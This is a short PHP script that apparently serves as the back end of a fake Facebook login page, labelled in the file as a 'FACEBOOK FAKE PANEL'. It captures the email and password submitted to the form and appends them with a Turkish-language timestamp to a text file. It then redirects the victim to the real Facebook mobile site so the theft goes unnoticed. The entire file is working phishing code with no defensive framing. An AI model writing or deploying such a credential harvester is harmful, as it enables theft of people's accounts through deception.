<?php

if (isset($_POST['email']) && isset($_POST['pass'])) {

$save = fopen("saved_info.txt","a+");
$eposta = $_POST['email'];
$password = $_POST['pass'];
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$vericekilen = ("
+-+-+ FACEBOOK FAKE PANEL +-+-+

 Tarih         : ".$tarih."

 E POSTA       : ".$eposta."

 Şifre         : ".$password."

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
fwrite($save,$vericekilen);
fclose($save);
header('Location: https://m.facebook.com');
}
?>
